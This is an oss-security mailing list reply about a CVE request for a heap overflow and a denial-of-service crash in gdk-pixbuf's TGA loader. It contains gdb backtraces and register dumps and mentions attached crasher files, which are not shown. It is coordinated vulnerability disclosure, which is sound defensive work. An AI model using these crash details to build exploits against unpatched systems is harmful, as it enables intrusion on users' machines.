X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["22482" "Monday" "5" "October" "2015" "08:10:39" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdQfCJjYaEQp0N5ZU+ZKc6g=FJjCYz2GPijSY+ZTpG0vxA@mail.gmail.com>" "462" "Re: [oss-security] CVE request: Heap overflow and DoS with a tga file in gdk-pixbuf < 2.32.1" nil nil nil "10" "2015100511:10:39" "[oss-security] CVE request: Heap overflow and DoS with a tga file in gdk-pixbuf < 2.32.1" (number mark "U       gustavo.grie Oct  5  462/22482 " thread-indent "\"Re: [oss-security] CVE request: Heap overflow and DoS with a tga file in gdk-pixbuf < 2.32.1\"\n") "<56124E86.90902@suse.com>" ("<CACn5sdR_PnnzeTT921B2mu2o1ceaC5qzKsKCuqHpK0FVp5OKng@mail.gmail.com>" "<CANO=Ty2QZBvdct3rx3+NdDV0CYf5eTu2V-tP5gsU8b0jH0bBmQ@mail.gmail.com>" "<CACn5sdRRJ1SfT-BVC6h97VHn6GGy_0W7thuwMSYwN29W7Om-XQ@mail.gmail.com>" "<56124E86.90902@suse.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30426 invoked by uid 550); 5 Oct 2015 11:10:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30398 invoked from network); 5 Oct 2015 11:10:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :content-type;
        bh=E2aYMQ6Ag8RM3/Fb4xMbpnoQ5qScl7UrnGIQQQVGaOM=;
        b=VDpKqSeserFaIR8PCJ9Fk5sei+dUcpTqQYJ5Qv8WXkSYhZo+ils6ozZTkmMyW/HpPt
         /63M7BZxvRPHj08zIbnmWMZCDINGfbGEq+O2pGsipjc1AyHwyr2gbVBmK28BSDxe0wLN
         xPWVHnd/Sec68EaEzM16mOUWHvhWU3v6e0w+Fq8I1/3APi98IxkiY58ha6U8SRdKdCgB
         OUklqIVWn72CLbTCkGo5o9zmb4zIlzAiz3T6lcelEvfl3QcHKMRr5PDUmwPdlCVXowYT
         NGWtiTU3sTv0IGKsR3fHI9l550v9if1uHQE1Jqcg7d33+xASaZ4Cl+vu+CmJMkeyUt1p
         q4Mg==
MIME-Version: 1.0
X-Received: by 10.25.78.79 with SMTP id c76mr7337336lfb.18.1444043439403; Mon,
 05 Oct 2015 04:10:39 -0700 (PDT)
In-Reply-To: <56124E86.90902@suse.com>
References: <CACn5sdR_PnnzeTT921B2mu2o1ceaC5qzKsKCuqHpK0FVp5OKng@mail.gmail.com>
	<CANO=Ty2QZBvdct3rx3+NdDV0CYf5eTu2V-tP5gsU8b0jH0bBmQ@mail.gmail.com>
	<CACn5sdRRJ1SfT-BVC6h97VHn6GGy_0W7thuwMSYwN29W7Om-XQ@mail.gmail.com>
	<56124E86.90902@suse.com>
Date: Mon, 5 Oct 2015 08:10:39 -0300
Message-ID: <CACn5sdQfCJjYaEQp0N5ZU+ZKc6g=FJjCYz2GPijSY+ZTpG0vxA@mail.gmail.com>
From: Gustavo Grieco <gustavo.grieco@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary=001a11406a5a3f827b052159909a
Subject: Re: [oss-security] CVE request: Heap overflow and DoS with a tga file
 in gdk-pixbuf < 2.32.1

--001a11406a5a3f827b052159909a
Content-Type: multipart/alternative; boundary=001a11406a5a3f82740521599098

--001a11406a5a3f82740521599098
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

2015-10-05 7:18 GMT-03:00 Andreas Stieger <astieger@suse.com>:

> Hello,
>
> On 10/01/2015 04:56 PM, Gustavo Grieco wrote:
> > Do you also need a crasher and a stack trace?
>
> Could you make them available please?
>

Sure! Please find attached the two test cases as well as a minimal example
of a vulnerable program: it is just a call to
gdk_pixbuf_new_from_file_at_size. Also, a detailed backtrace of the heap
overflow is here:

Starting program: pixbuf_vuln_poc overflow.tga
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
scale_line (weights=3Dweights@entry=3D0x2aab3c468c10, n_x=3D148, n_y=3D148,
dest=3Ddest@entry=3D0x630ee0 "", dest_x=3Ddest_x@entry=3D0,
    dest_end=3Ddest_end@entry=3D0x631144 "", dest_channels=3Ddest_channels@=
entry=3D4,
dest_has_alpha=3Ddest_has_alpha@entry=3D1, src=3Dsrc@entry=3D0x63ce60,
    src_channels=3Dsrc_channels@entry=3D4, src_has_alpha=3Dsrc_has_alpha@en=
try=3D1,
x_init=3D<optimized out>, x_step=3Dx_step@entry=3D9629110,
    src_width=3Dsrc_width@entry=3D22627, check_size=3Dcheck_size@entry=3D0,
color1=3Dcolor1@entry=3D0, color2=3Dcolor2@entry=3D0) at pixops.c:974
974
(gdb) bt
#0  scale_line (weights=3Dweights@entry=3D0x2aab3c468c10, n_x=3D148, n_y=3D=
148,
dest=3Ddest@entry=3D0x630ee0 "", dest_x=3Ddest_x@entry=3D0,
    dest_end=3Ddest_end@entry=3D0x631144 "", dest_channels=3Ddest_channels@=
entry=3D4,
dest_has_alpha=3Ddest_has_alpha@entry=3D1, src=3Dsrc@entry=3D0x63ce60,
    src_channels=3Dsrc_channels@entry=3D4, src_has_alpha=3Dsrc_has_alpha@en=
try=3D1,
x_init=3D<optimized out>, x_step=3Dx_step@entry=3D9629110,
    src_width=3Dsrc_width@entry=3D22627, check_size=3Dcheck_size@entry=3D0,
color1=3Dcolor1@entry=3D0, color2=3Dcolor2@entry=3D0) at pixops.c:974
#1  0x00002aaaaace5698 in pixops_process (dest_buf=3D<optimized out>,
render_x0=3D0, render_y0=3D<optimized out>, render_x1=3D<optimized out>,
    render_y1=3D<optimized out>, dest_rowstride=3D<optimized out>,
dest_channels=3D4, dest_has_alpha=3D1, src_buf=3D0x2aaaad14f010 "",
src_width=3D22627,
    src_height=3D26435, src_rowstride=3D90508, src_channels=3D4, src_has_al=
pha=3D1,
scale_x=3D<optimized out>, scale_y=3D<optimized out>, check_x=3D0, check_y=
=3D0,
    check_size=3D0, color1=3D0, color2=3D0, filter=3D0x7ffffffedc90,
line_func=3D0x2aaaaace3c10 <scale_line>, pixel_func=3D0x2aaaaace49a0
<scale_pixel>)
    at pixops.c:1366
#2  0x00002aaaaace5f09 in _pixops_scale_real
(interp_type=3DPIXOPS_INTERP_BILINEAR, interp_type@entry
=3DPIXOPS_INTERP_NEAREST,
    scale_y=3D0,0068091545299791946, scale_x=3D0,0068060281964025283,
src_has_alpha=3D1, src_channels=3D4, src_rowstride=3D90508, src_height=3D26=
435,
    src_width=3D22627, src_buf=3D0x2aaaad14f010 "", dest_has_alpha=3D1,
dest_channels=3D4, dest_rowstride=3D616, render_y1=3D<optimized out>,
render_x1=3D154,
    render_y0=3D<optimized out>, render_x0=3D0, dest_buf=3D<optimized out>)=
 at
pixops.c:2230
#3  _pixops_scale (dest_buf=3D<optimized out>, dest_width=3Ddest_width@entr=
y=3D154,
dest_height=3Ddest_height@entry=3D180, dest_rowstride=3D616, dest_channels=
=3D4,
    dest_has_alpha=3D1, src_buf=3D0x2aaaad14f010 "", src_width=3D22627,
src_height=3D26435, src_rowstride=3D90508, src_channels=3D4, src_has_alpha=
=3D1,
    dest_x=3Ddest_x@entry=3D0, dest_y=3Ddest_y@entry=3D0,
dest_region_width=3Ddest_region_width@entry=3D154,
dest_region_height=3Ddest_region_height@entry=3D180,
    offset_x=3Doffset_x@entry=3D0, offset_y=3D<optimized out>,
scale_x=3Dscale_x@entry=3D0,0068060281964025283, scale_y=3Dscale_y@entry
=3D0,0068091545299791946,
    interp_type=3Dinterp_type@entry=3DPIXOPS_INTERP_BILINEAR) at pixops.c:2=
285
#4  0x00002aaaaacdda2d in gdk_pixbuf_scale (src=3D0x618000, dest=3D0x618050,
dest_x=3D0, dest_y=3D0, dest_width=3D154, dest_height=3D180, offset_x=3D0,
    offset_y=3D<optimized out>, scale_x=3D0,0068060281964025283,
scale_y=3D0,0068091545299791946, interp_type=3DGDK_INTERP_BILINEAR) at
gdk-pixbuf-scale.c:147
#5  0x00002aaaaacde07a in gdk_pixbuf_scale_simple (src=3Dsrc@entry=3D0x6180=
00,
dest_width=3D154, dest_height=3Ddest_height@entry=3D180,
    interp_type=3Dinterp_type@entry=3DGDK_INTERP_BILINEAR) at
gdk-pixbuf-scale.c:321
#6  0x00002aaaaacdf340 in get_scaled_pixbuf (scaled=3D0x616440,
pixbuf=3D0x618000) at gdk-pixbuf-scaled-anim.c:138
#7  0x00002aaaaacdae88 in gdk_pixbuf_new_from_file_at_scale
(filename=3D0x7fffffffe36b "overflow.tga", width=3D<optimized out>,
height=3D<optimized out>,
    preserve_aspect_ratio=3D<optimized out>, error=3D0x7fffffffdee0) at
gdk-pixbuf-io.c:1377
#8  0x00000000004007b8 in main ()

(gdb) x/i $rip
=3D> 0x2aaaaace3dd0 <scale_line+448>:        movzbl 0x3(%rcx),%edx
(gdb) info registers
rax            0x0        0
rbx            0x94        148
rcx            0x2aaa2d6d51c4        46910394945988
rdx            0x0        0
rsi            0x4        4
rdi            0x2aab3c468c10        46914939030544
rbp            0x2aab3c468e60        0x2aab3c468e60
rsp            0x7ffffffeda18        0x7ffffffeda18
r8             0x0        0
r9             0x0        0
r10            0x0        0
r11            0x0        0
r12            0x0        0
r13            0x63ce60        6540896
r14            0x2aab3c468c10        46914939030544
r15            0x94        148
rip            0x2aaaaace3dd0        0x2aaaaace3dd0 <scale_line+448>
eflags         0x10202        [ IF RF ]
cs             0x33        51
ss             0x2b        43
ds             0x0        0
es             0x0        0
fs             0x0        0
gs             0x0        0

And the backtrace of the DoS here:

Starting program: pixbuf_vuln_poc DoS.tga
[Depuraci=C3=B3n de hilo usando libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00002aaaacf4c384 in parse_data_for_row_pseudocolor (ctx=3D0x614ca0) at
io-tga.c:367
367
(gdb) bt
#0  0x00002aaaacf4c384 in parse_data_for_row_pseudocolor (ctx=3D0x614ca0) at
io-tga.c:367
#1  parse_data_for_row (err=3D0x7ffffffede28, ctx=3D0x614ca0) at io-tga.c:4=
13
#2  gdk_pixbuf__tga_load_increment (data=3D0x614ca0, buffer=3D<optimized ou=
t>,
size=3D<optimized out>, err=3D0x7ffffffede28) at io-tga.c:922
#3  0x00002aaaaacdca45 in gdk_pixbuf_loader_load_module
(loader=3Dloader@entry=3D0x60f200,
image_type=3Dimage_type@entry=3D0x0,
    error=3Derror@entry=3D0x7ffffffede28) at gdk-pixbuf-loader.c:445
#4  0x00002aaaaacdd2b8 in gdk_pixbuf_loader_close
(loader=3Dloader@entry=3D0x60f200,
error=3Derror@entry=3D0x7fffffffdef0) at gdk-pixbuf-loader.c:810
#5  0x00002aaaaacdae2a in gdk_pixbuf_new_from_file_at_scale
(filename=3D0x7fffffffe370 "DoS.tga", width=3D<optimized out>,
height=3D<optimized out>,
    preserve_aspect_ratio=3D<optimized out>, error=3D0x7fffffffdef0) at
gdk-pixbuf-io.c:1372
#6  0x00000000004007b8 in main ()

(gdb) x/i $rip
=3D> 0x2aaaacf4c384 <gdk_pixbuf__tga_load_increment+612>:        mov
 0x8(%rdx),%rdx
(gdb) info registers
rax            0x6163e0        6382560
rbx            0x614ca0        6376608
rcx            0x7        7
rdx            0x0        0
rsi            0x611b02        6363906
rdi            0x618000        6389760
rbp            0x7ffffffede28        0x7ffffffede28
rsp            0x7ffffffedd80        0x7ffffffedd80
r8             0x616200        6382080
r9             0x6163e7        6382567
r10            0x8        8
r11            0x2aaaaaf05c10        46912500685840
r12            0x0        0
r13            0x0        0
r14            0x15        21
r15            0xb        11
rip            0x2aaaacf4c384        0x2aaaacf4c384
<gdk_pixbuf__tga_load_increment+612>
eflags         0x10202        [ IF RF ]
cs             0x33        51
ss             0x2b        43
ds             0x0        0
es             0x0        0
fs             0x0        0
gs             0x0        0


>
> Thanks,
> Andreas
>
> --
> Andreas Stieger <astieger@suse.com>
> Project Manager Security
> SUSE Linux GmbH, GF: Felix Imend=C3=B6rffer, Jane Smithard, Graham Norton=
, HRB
> 21284 (AG N=C3=BCrnberg)
>
>
>

--001a11406a5a3f82740521599098
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div class=3D"gmail_extra"><div class=3D"gmail_quote">2015=
-10-05 7:18 GMT-03:00 Andreas Stieger <span dir=3D"ltr">&lt;<a href=3D"mail=
to:astieger@suse.com" target=3D"_blank">astieger@suse.com</a>&gt;</span>:<b=
r><blockquote class=3D"gmail_quote" style=3D"margin:0px 0px 0px 0.8ex;borde=
r-left:1px solid rgb(204,204,204);padding-left:1ex">Hello,<br>
<span class=3D""><br>
On 10/01/2015 04:56 PM, Gustavo Grieco wrote:<br>
&gt; Do you also need a crasher and a stack trace?<br>
<br>
</span>Could you make them available please?<br></blockquote><div><br></div=
><div>Sure! Please find attached the two test cases as well as a minimal=20
example of a vulnerable program: it is just a call to=20
gdk_pixbuf_new_from_file_at_size. Also, a detailed backtrace of the heap
 overflow is here:<br><br>Starting program: pixbuf_vuln_poc overflow.tga<br=
>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.s=
o.1&quot;.<br><br>Program received signal SIGSEGV, Segmentation fault.<br>s=
cale_line (weights=3Dweights@entry=3D0x2aab3c468c10, n_x=3D148, n_y=3D148, =
dest=3Ddest@entry=3D0x630ee0 &quot;&quot;, dest_x=3Ddest_x@entry=3D0,<br>=
=C2=A0
 =C2=A0 dest_end=3Ddest_end@entry=3D0x631144 &quot;&quot;,=20
dest_channels=3Ddest_channels@entry=3D4,=20
dest_has_alpha=3Ddest_has_alpha@entry=3D1, src=3Dsrc@entry=3D0x63ce60,<br>=
=C2=A0 =C2=A0=20
src_channels=3Dsrc_channels@entry=3D4, src_has_alpha=3Dsrc_has_alpha@entry=
=3D1,=20
x_init=3D&lt;optimized out&gt;, x_step=3Dx_step@entry=3D9629110,<br>=C2=A0 =
=C2=A0=20
src_width=3Dsrc_width@entry=3D22627, check_size=3Dcheck_size@entry=3D0,=20
color1=3Dcolor1@entry=3D0, color2=3Dcolor2@entry=3D0) at pixops.c:974<br>97=
4 =C2=A0 =C2=A0 =C2=A0 =C2=A0<br>(gdb) bt<br>#0 =C2=A0scale_line (weights=
=3Dweights@entry=3D0x2aab3c468c10, n_x=3D148, n_y=3D148, dest=3Ddest@entry=
=3D0x630ee0 &quot;&quot;, dest_x=3Ddest_x@entry=3D0,<br>=C2=A0
 =C2=A0 dest_end=3Ddest_end@entry=3D0x631144 &quot;&quot;,=20
dest_channels=3Ddest_channels@entry=3D4,=20
dest_has_alpha=3Ddest_has_alpha@entry=3D1, src=3Dsrc@entry=3D0x63ce60,<br>=
=C2=A0 =C2=A0=20
src_channels=3Dsrc_channels@entry=3D4, src_has_alpha=3Dsrc_has_alpha@entry=
=3D1,=20
x_init=3D&lt;optimized out&gt;, x_step=3Dx_step@entry=3D9629110,<br>=C2=A0 =
=C2=A0=20
src_width=3Dsrc_width@entry=3D22627, check_size=3Dcheck_size@entry=3D0,=20
color1=3Dcolor1@entry=3D0, color2=3Dcolor2@entry=3D0) at pixops.c:974<br>#1=
=20
=C2=A00x00002aaaaace5698 in pixops_process (dest_buf=3D&lt;optimized out&gt=
;,=20
render_x0=3D0, render_y0=3D&lt;optimized out&gt;, render_x1=3D&lt;optimized=
=20
out&gt;,<br>=C2=A0 =C2=A0 render_y1=3D&lt;optimized out&gt;,=20
dest_rowstride=3D&lt;optimized out&gt;, dest_channels=3D4, dest_has_alpha=
=3D1,
 src_buf=3D0x2aaaad14f010 &quot;&quot;, src_width=3D22627,<br>=C2=A0 =C2=A0=
 src_height=3D26435,=20
src_rowstride=3D90508, src_channels=3D4, src_has_alpha=3D1,=20
scale_x=3D&lt;optimized out&gt;, scale_y=3D&lt;optimized out&gt;, check_x=
=3D0,
 check_y=3D0,<br>=C2=A0 =C2=A0 check_size=3D0, color1=3D0, color2=3D0,=20
filter=3D0x7ffffffedc90, line_func=3D0x2aaaaace3c10 &lt;scale_line&gt;,=20
pixel_func=3D0x2aaaaace49a0 &lt;scale_pixel&gt;)<br>=C2=A0 =C2=A0 at pixops=
.c:1366<br>#2 =C2=A00x00002aaaaace5f09 in _pixops_scale_real (interp_type=
=3DPIXOPS_INTERP_BILINEAR, interp_type@entry=3DPIXOPS_INTERP_NEAREST,<br>=
=C2=A0
 =C2=A0 scale_y=3D0,0068091545299791946, scale_x=3D0,0068060281964025283,=20
src_has_alpha=3D1, src_channels=3D4, src_rowstride=3D90508, src_height=3D26=
435,<br>=C2=A0
 =C2=A0 src_width=3D22627, src_buf=3D0x2aaaad14f010 &quot;&quot;, dest_has_=
alpha=3D1,=20
dest_channels=3D4, dest_rowstride=3D616, render_y1=3D&lt;optimized out&gt;,=
=20
render_x1=3D154,<br>=C2=A0 =C2=A0 render_y0=3D&lt;optimized out&gt;, render=
_x0=3D0, dest_buf=3D&lt;optimized out&gt;) at pixops.c:2230<br>#3
 =C2=A0_pixops_scale (dest_buf=3D&lt;optimized out&gt;,=20
dest_width=3Ddest_width@entry=3D154, dest_height=3Ddest_height@entry=3D180,=
=20
dest_rowstride=3D616, dest_channels=3D4,<br>=C2=A0 =C2=A0 dest_has_alpha=3D=
1,=20
src_buf=3D0x2aaaad14f010 &quot;&quot;, src_width=3D22627, src_height=3D2643=
5,=20
src_rowstride=3D90508, src_channels=3D4, src_has_alpha=3D1,<br>=C2=A0 =C2=
=A0=20
dest_x=3Ddest_x@entry=3D0, dest_y=3Ddest_y@entry=3D0,=20
dest_region_width=3Ddest_region_width@entry=3D154,=20
dest_region_height=3Ddest_region_height@entry=3D180,<br>=C2=A0 =C2=A0=20
offset_x=3Doffset_x@entry=3D0, offset_y=3D&lt;optimized out&gt;,=20
scale_x=3Dscale_x@entry=3D0,0068060281964025283,=20
scale_y=3Dscale_y@entry=3D0,0068091545299791946,<br>=C2=A0 =C2=A0 interp_ty=
pe=3Dinterp_type@entry=3DPIXOPS_INTERP_BILINEAR) at pixops.c:2285<br>#4
 =C2=A00x00002aaaaacdda2d in gdk_pixbuf_scale (src=3D0x618000, dest=3D0x618=
050,=20
dest_x=3D0, dest_y=3D0, dest_width=3D154, dest_height=3D180, offset_x=3D0,<=
br>=C2=A0 =C2=A0=20
offset_y=3D&lt;optimized out&gt;, scale_x=3D0,0068060281964025283,=20
scale_y=3D0,0068091545299791946, interp_type=3DGDK_INTERP_BILINEAR) at=20
gdk-pixbuf-scale.c:147<br>#5 =C2=A00x00002aaaaacde07a in gdk_pixbuf_scale_s=
imple (src=3Dsrc@entry=3D0x618000, dest_width=3D154, dest_height=3Ddest_hei=
ght@entry=3D180,<br>=C2=A0 =C2=A0 interp_type=3Dinterp_type@entry=3DGDK_INT=
ERP_BILINEAR) at gdk-pixbuf-scale.c:321<br>#6 =C2=A00x00002aaaaacdf340 in g=
et_scaled_pixbuf (scaled=3D0x616440, pixbuf=3D0x618000) at gdk-pixbuf-scale=
d-anim.c:138<br>#7
 =C2=A00x00002aaaaacdae88 in gdk_pixbuf_new_from_file_at_scale=20
(filename=3D0x7fffffffe36b &quot;overflow.tga&quot;, width=3D&lt;optimized =
out&gt;,=20
height=3D&lt;optimized out&gt;,<br>=C2=A0 =C2=A0 preserve_aspect_ratio=3D&l=
t;optimized out&gt;, error=3D0x7fffffffdee0) at gdk-pixbuf-io.c:1377<br>#8 =
=C2=A00x00000000004007b8 in main ()<br><br>(gdb) x/i $rip<br>=3D&gt; 0x2aaa=
aace3dd0 &lt;scale_line+448&gt;: =C2=A0 =C2=A0 =C2=A0 =C2=A0movzbl 0x3(%rcx=
),%edx<br>(gdb) info registers<br>rax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A00x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>rbx =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A00x94 =C2=A0 =C2=A0 =C2=A0 =C2=A0148<br>rcx =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A00x2aaa2d6d51c4 =C2=A0 =C2=A0 =C2=A0 =C2=A0469103949=
45988<br>rdx =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A00<br>rsi =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x4 =C2=A0 =C2=
=A0 =C2=A0 =C2=A04<br>rdi =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aab3c=
468c10 =C2=A0 =C2=A0 =C2=A0 =C2=A046914939030544<br>rbp =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A00x2aab3c468e60 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aab3c4=
68e60<br>rsp =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x7ffffffeda18 =C2=A0=
 =C2=A0 =C2=A0 =C2=A00x7ffffffeda18<br>r8 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r9 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r10 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r11 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r12 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r=
13 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x63ce60 =C2=A0 =C2=A0 =C2=A0 =
=C2=A06540896<br>r14 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aab3c468c1=
0 =C2=A0 =C2=A0 =C2=A0 =C2=A046914939030544<br>r15 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A00x94 =C2=A0 =C2=A0 =C2=A0 =C2=A0148<br>rip =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A00x2aaaaace3dd0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aaa=
aace3dd0 &lt;scale_line+448&gt;<br>eflags =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x102=
02 =C2=A0 =C2=A0 =C2=A0 =C2=A0[ IF RF ]<br>cs =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 0x33 =C2=A0 =C2=A0 =C2=A0 =C2=A051<br>ss =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 0x2b =C2=A0 =C2=A0 =C2=A0 =C2=A043<br>ds =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>es =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>=
fs =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A00<br>gs =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A00<br><br>And the backtrace of the DoS here:<br><br>Starting progr=
am: pixbuf_vuln_poc DoS.tga<br>[Depuraci=C3=B3n de hilo usando libthread_db=
 enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/li=
bthread_db.so.1&quot;.<br><br>Program received signal SIGSEGV, Segmentation=
 fault.<br>0x00002aaaacf4c384 in parse_data_for_row_pseudocolor (ctx=3D0x61=
4ca0) at io-tga.c:367<br>367<br>(gdb) bt<br>#0 =C2=A00x00002aaaacf4c384 in =
parse_data_for_row_pseudocolor (ctx=3D0x614ca0) at io-tga.c:367<br>#1 =C2=
=A0parse_data_for_row (err=3D0x7ffffffede28, ctx=3D0x614ca0) at io-tga.c:41=
3<br>#2
 =C2=A0gdk_pixbuf__tga_load_increment (data=3D0x614ca0, buffer=3D&lt;optimi=
zed=20
out&gt;, size=3D&lt;optimized out&gt;, err=3D0x7ffffffede28) at io-tga.c:92=
2<br>#3 =C2=A00x00002aaaaacdca45 in gdk_pixbuf_loader_load_module (loader=
=3Dloader@entry=3D0x60f200, image_type=3Dimage_type@entry=3D0x0,<br>=C2=A0 =
=C2=A0 error=3Derror@entry=3D0x7ffffffede28) at gdk-pixbuf-loader.c:445<br>=
#4
 =C2=A00x00002aaaaacdd2b8 in gdk_pixbuf_loader_close=20
(loader=3Dloader@entry=3D0x60f200, error=3Derror@entry=3D0x7fffffffdef0) at=
=20
gdk-pixbuf-loader.c:810<br>#5 =C2=A00x00002aaaaacdae2a in=20
gdk_pixbuf_new_from_file_at_scale (filename=3D0x7fffffffe370 &quot;DoS.tga&=
quot;,=20
width=3D&lt;optimized out&gt;, height=3D&lt;optimized out&gt;,<br>=C2=A0 =
=C2=A0 preserve_aspect_ratio=3D&lt;optimized out&gt;, error=3D0x7fffffffdef=
0) at gdk-pixbuf-io.c:1372<br>#6 =C2=A00x00000000004007b8 in main ()<br><br=
>(gdb) x/i $rip<br>=3D&gt; 0x2aaaacf4c384 &lt;gdk_pixbuf__tga_load_incremen=
t+612&gt;: =C2=A0 =C2=A0 =C2=A0 =C2=A0mov =C2=A0 =C2=A00x8(%rdx),%rdx<br>(g=
db) info registers<br>rax =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x6163e0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A06382560<br>rbx =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A00x614ca0 =C2=A0 =C2=A0 =C2=A0 =C2=A06376608<br>rcx =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A00x7 =C2=A0 =C2=A0 =C2=A0 =C2=A07<br>rdx =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>rsi =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x611b02 =C2=A0 =C2=A0 =C2=A0 =C2=
=A06363906<br>rdi =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x618000 =C2=A0 =
=C2=A0 =C2=A0 =C2=A06389760<br>rbp =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A00x7ffffffede28 =C2=A0 =C2=A0 =C2=A0 =C2=A00x7ffffffede28<br>rsp =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x7ffffffedd80 =C2=A0 =C2=A0 =C2=A0 =C2=
=A00x7ffffffedd80<br>r8 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x616200 =
=C2=A0 =C2=A0 =C2=A0 =C2=A06382080<br>r9 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 0x6163e7 =C2=A0 =C2=A0 =C2=A0 =C2=A06382567<br>r10 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A00x8 =C2=A0 =C2=A0 =C2=A0 =C2=A08<br>r11 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aaaaaf05c10 =C2=A0 =C2=A0 =C2=A0 =C2=
=A046912500685840<br>r12 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00x0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A00<br>r13 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A00=
x0 =C2=A0 =C2=A0 =C2=A0 =C2=A00<br>r14 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A00x15 =C2=A0 =C2=A0 =C2=A0 =C2=A021<br>r15 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A00xb =C2=A0 =C2=A0 =C2=A0 =C2=A011<br>rip =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A00x2aaaacf4c384 =C2=A0 =C2=A0 =C2=A0 =C2=A00x2aaaacf4c3=
84 &lt;gdk_pixbuf__tga_load_increment+612&gt;<br>eflags =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 0x10202 =C2=A0 =C2=A0 =C2=A0 =C2=A0[ IF RF ]<br>cs =C2=A0 =C2=A0=
